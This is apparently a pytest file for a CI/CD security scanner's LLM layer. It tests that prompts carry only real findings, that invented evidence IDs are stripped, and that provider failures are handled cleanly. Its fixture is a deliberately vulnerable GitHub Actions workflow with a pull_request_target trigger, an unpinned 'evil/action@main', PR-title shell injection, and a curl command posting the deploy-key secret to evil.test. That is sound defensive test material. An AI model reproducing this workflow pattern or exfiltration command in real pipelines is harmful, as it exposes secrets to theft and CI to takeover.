"""LLM tests. None of these reach the network or need an API key.

The behaviour under test is not "does Gemini answer well" -- that is not
something a unit test can assert. It is the boundary around the model: that the
prompt contains only real evidence, that a malformed or ungrounded response is
rejected, and that every failure still leaves the deterministic report intact.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from supplytrace.cicd.evidence.collector import scan_repository
from supplytrace.cicd.graph.builder import build_graph
from supplytrace.cicd.graph.correlation import find_attack_paths
from supplytrace.cicd.llm.base import LLMError, LLMResponse, NullProvider
from supplytrace.cicd.llm.gemini import GeminiProvider, correlate
from supplytrace.cicd.llm.prompts import build_evidence_package, select_findings
from supplytrace.cicd.llm.schemas import (
    LLMConfidence,
    LLMVerdict,
    extract_json,
    validate_response,
)

VULNERABLE = """\
on:
  pull_request_target:
    types: [opened]
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: evil/action@main
      - env:
          TOKEN: ${{ secrets.DEPLOY_KEY }}
        run: |
          echo "pr ${{ github.event.pull_request.title }}"
          curl -X POST -d "t=$TOKEN" https://evil.test/collect
"""


@pytest.fixture
def scanned(tmp_path: Path):
    directory = tmp_path / ".github" / "workflows"
    directory.mkdir(parents=True)
    (directory / "wf.yml").write_text(VULNERABLE, encoding="utf-8")
    result = scan_repository(tmp_path)
    graph = build_graph(result)
    return result, graph, find_attack_paths(graph)


class FakeProvider:
    """A provider that returns whatever the test hands it."""

    name = "fake"

    def __init__(self, reply: str = "", *, available: bool = True, raises: bool = False):
        self.reply = reply
        self._available = available
        self._raises = raises
        self.prompts: list[str] = []

    def is_available(self) -> bool:
        return self._available

    def generate(self, prompt: str, *, system: str = "") -> LLMResponse:
        self.prompts.append(prompt)
        if self._raises:
            raise LLMError("simulated transport failure")
        return LLMResponse(text=self.reply, model="fake-1")


def valid_reply(evidence_ids: list[str]) -> str:
    return json.dumps(
        {
            "verdict": "POTENTIAL_ATTACK_CHAIN",
            "confidence": "HIGH",
            "entry_point": "a pull request from a fork",
            "attack_chain": ["outsider opens a PR", "title reaches the shell"],
            "evidence_ids": evidence_ids,
            "impact": ["the deploy key can be read"],
            "attacker_requirements": ["ability to open a pull request"],
            "missing_evidence": ["whether the workflow has ever run"],
            "recommended_actions": ["pass the title through env"],
            "summary": "Untrusted PR content reaches a shell holding a secret.",
        }
    )


class TestPromptConstruction:
    def test_prompt_contains_only_real_finding_ids(self, scanned) -> None:
        result, graph, paths = scanned
        package = build_evidence_package(result, graph, paths)
        known = {f.id for f in result.findings}
        assert package.allowed_ids <= known
        assert package.allowed_ids

    def test_prompt_includes_snippets_and_locations(self, scanned) -> None:
        result, graph, paths = scanned
        package = build_evidence_package(result, graph, paths)
        assert ".github/workflows/wf.yml" in package.prompt
        assert "evil/action@main" in package.prompt

    def test_prompt_forbids_invention(self, scanned) -> None:
        from supplytrace.cicd.llm.prompts import SYSTEM_PROMPT

        assert "Never invent" in SYSTEM_PROMPT
        assert "Do not claim an attack has occurred" in SYSTEM_PROMPT

    def test_info_findings_are_not_sent_when_real_ones_exist(self, scanned) -> None:
        """Feeding a model inventory records invites a story about nothing."""

        result, _, _ = scanned
        from supplytrace.cicd.evidence.models import Severity

        selected = select_findings(result)
        assert selected
        assert all(f.severity is not Severity.INFO for f in selected)

    def test_selection_is_bounded(self, scanned) -> None:
        result, _, _ = scanned
        assert len(select_findings(result, limit=2)) <= 2


class TestResponseValidation:
    def test_a_valid_response_is_accepted(self, scanned) -> None:
        result, _, _ = scanned
        ids = [result.findings[0].id]
        report = validate_response(valid_reply(ids), {*ids})
        assert report.ok
        assert report.analysis.verdict is LLMVerdict.POTENTIAL_ATTACK_CHAIN
        assert report.analysis.evidence_ids == ids

    def test_invented_finding_ids_are_stripped_and_reported(self) -> None:
        """The check that stops the model asserting things nobody can verify."""

        reply = valid_reply(["F001", "F999"])
        report = validate_response(reply, {"F001"})
        assert report.analysis.evidence_ids == ["F001"]
        assert report.hallucinated_ids == ["F999"]
        assert any("not provided" in e for e in report.errors)

    def test_a_chain_with_no_valid_evidence_is_downgraded(self) -> None:
        reply = valid_reply(["F999"])
        report = validate_response(reply, {"F001"})
        assert report.analysis.verdict is LLMVerdict.INSUFFICIENT_EVIDENCE
        assert report.analysis.confidence is LLMConfidence.LOW

    def test_malformed_json_is_rejected(self) -> None:
        report = validate_response("this is not json", {"F001"})
        assert not report.ok
        assert report.errors

    def test_an_empty_response_is_rejected(self) -> None:
        assert not validate_response("", {"F001"}).ok

    def test_a_response_missing_required_fields_is_rejected(self) -> None:
        report = validate_response(json.dumps({"verdict": "NOPE"}), {"F001"})
        assert not report.ok

    @pytest.mark.parametrize(
        "wrapped",
        [
            '```json\n{"verdict": "NO_SIGNIFICANT_RISK", "confidence": "LOW"}\n```',
            '```\n{"verdict": "NO_SIGNIFICANT_RISK", "confidence": "LOW"}\n```',
            'Here you go:\n{"verdict": "NO_SIGNIFICANT_RISK", "confidence": "LOW"}\nHope that helps!',
        ],
    )
    def test_json_is_recovered_from_the_wrappers_models_actually_add(
        self, wrapped: str
    ) -> None:
        report = validate_response(wrapped, set())
        assert report.ok
        assert report.analysis.verdict is LLMVerdict.NO_SIGNIFICANT_RISK

    def test_extract_json_handles_bare_objects(self) -> None:
        assert extract_json('{"a": 1}') == '{"a": 1}'


class TestCorrelation:
    def test_correlation_uses_only_the_supplied_provider(self, scanned) -> None:
        result, graph, paths = scanned
        ids = [f.id for f in result.findings[:2]]
        provider = FakeProvider(valid_reply(ids))

        outcome = correlate(result, graph, paths, provider=provider)

        assert outcome.ok
        assert provider.prompts, "the provider was never called"
        assert outcome.analysis.evidence_ids == ids
        assert outcome.model == "fake-1"

    def test_a_provider_failure_does_not_raise(self, scanned) -> None:
        """The deterministic report is already complete and must still print."""

        result, graph, paths = scanned
        outcome = correlate(result, graph, paths, provider=FakeProvider(raises=True))
        assert not outcome.ok
        assert any("simulated transport failure" in e for e in outcome.errors)

    def test_an_unavailable_provider_is_skipped_cleanly(self, scanned) -> None:
        result, graph, paths = scanned
        outcome = correlate(result, graph, paths, provider=NullProvider())
        assert not outcome.ok
        assert outcome.skipped_reason
        assert outcome.errors == []

    def test_hallucinated_ids_surface_on_the_result(self, scanned) -> None:
        result, graph, paths = scanned
        outcome = correlate(
            result, graph, paths, provider=FakeProvider(valid_reply(["F404"]))
        )
        assert outcome.hallucinated_ids == ["F404"]


class TestGeminiProvider:
    def test_is_unavailable_without_a_key(self, monkeypatch) -> None:
        for variable in ("GEMINI_API_KEY", "GOOGLE_API_KEY"):
            monkeypatch.delenv(variable, raising=False)
        assert GeminiProvider().is_available() is False

    def test_generating_without_a_key_raises_a_clear_error(self, monkeypatch) -> None:
        for variable in ("GEMINI_API_KEY", "GOOGLE_API_KEY"):
            monkeypatch.delenv(variable, raising=False)
        with pytest.raises(LLMError, match="no API key"):
            GeminiProvider().generate("hello")

    def test_the_key_is_read_from_the_environment_only(self, monkeypatch) -> None:
        monkeypatch.setenv("GEMINI_API_KEY", "test-key-not-real")
        provider = GeminiProvider()
        assert provider._api_key == "test-key-not-real"

    def test_null_provider_always_refuses(self) -> None:
        with pytest.raises(LLMError):
            NullProvider().generate("hello")
